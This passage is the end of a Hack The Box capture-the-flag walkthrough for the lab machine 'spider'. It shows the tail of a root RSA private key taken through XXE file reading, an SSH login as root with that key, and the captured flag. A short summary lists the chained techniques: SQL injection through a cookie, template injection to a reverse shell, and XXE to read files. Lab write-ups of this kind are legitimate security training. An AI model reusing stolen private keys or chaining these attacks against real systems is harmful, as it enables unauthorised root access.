class="line">HtCvxuXOFnyo/I+A3j1dPHoc5UH56g1W82NwTCbtCfMfeUsUOByLcg3yEypClO/M</span><br><span class="line">s7pWQ1e4m27/NmU7R/cslc03YFQxow+CIbdd59dBKTZKErdiMd49WiZSxizL7Rdt</span><br><span class="line">WBTACsUCgYEAyU9azupb71YnGQVLpdTOzoTD6ReZlbDGeqz4BD5xzbkDj7MOT5Dy</span><br><span class="line">R335NRBf7EJC0ODXNVSY+4vEXqMTx9eTxpMtsP6u0WvIYwy9C7K/wCz+WXNV0zc0</span><br><span class="line">kcSQH/Yfkd2jADkMxHXkz9THXCChOfEt7IUmNSM2VBKb1xBMkuLXQbMCgYEAwUBS</span><br><span class="line">FhRNrIB3os7qYayE+XrGVdx/KXcKva6zn20YktWYlH2HLfXcFQQdr30cPxxBSriS</span><br><span class="line">BAKYcdFXSUQDPJ1/qE21OvDLmJFu4Xs7ZdGG8o5v8JmF6TLTwi0Vi45g38DJagEl</span><br><span class="line">w42zV3vV7bsAhQsMvd3igLEoDFt34jO9nQv9KBcCgYEAk8eLVAY7AxFtljKK++ui</span><br><span class="line">/Xv9DWnjtz2UFo5Pa14j0O+Wq7C4OrSfBth1Tvz8TcW+ovPLSD0YKODLgOWaKcQZ</span><br><span class="line">mVaF3j64OsgyzHOXe7T2iq788NF4GZuXHcL8Qlo9hqj7dbhrpPUeyWrcBsd1U8G3</span><br><span class="line">AsAj8jItOb6HZHN0owefGX0CgYAICQmgu2VjZ9ARp/Lc7tR0nyNCDLII4ldC/dGg</span><br><span class="line">LmQYLuNyQSnuwktNYGdvlY8oHJ+mYLhJjGYUTXUIqdhMm+vj7p87fSmqBVoL7BjT</span><br><span class="line">Kfwnd761zVxhDuj5KPC9ZcUnaJe3XabZU7oCSDbj9KOX5Ja6ClDRswwMP31jnW0j</span><br><span class="line">64yyLwKBgBkRFxxuGkB9IMmcN19zMWA6akE0/jD6c/51IRx9lyeOmWFPqitNenWK</span><br><span class="line">teYjUjFTLgoi8MSTPAVufpdQV4128HuMbMLVpHYOVWKH/noFetpTE2uFStsNrMD8</span><br><span class="line">vEgG/fMJ9XmHVsPePviZBfrnszhP77sgCXX8Grhx9GlVMUdxeo+j</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s save the id_rsa and ssh in and get our root.txt.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/spider]</span><br><span class="line">└─<span class="comment"># ssh -i root_rsa root@10.10.10.243</span></span><br><span class="line">Last login: Mon May 31 13:58:50 2021</span><br><span class="line">root@spider:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@spider:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@spider:~<span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@spider:~<span class="comment"># cat root.txt</span></span><br><span class="line">6dee7d55ac7082e677f515981ce678c7</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1993.jpg"></li>
+</ul>
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>use sqlmap –eval config key cookie sql injection</li>
+<li>Server Side Template Injection to get a reverse shell</li>
+<li>use XML External Entity Injection to got lfi to get the root id_rsa key</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/06/04/spider/" title="Hack-The-Box-walkthrough[spider]">https://fdlucifer.github.io/2021/06/04/spider/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/05/23/knife/" rel="prev" title="Hack-The-Box-walkthrough[knife]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[knife]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/06/06/cap/" rel="next" title="Hack-The-Box-walkthrough[Cap]">
+                  Hack-The-Box-walkthrough[Cap] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
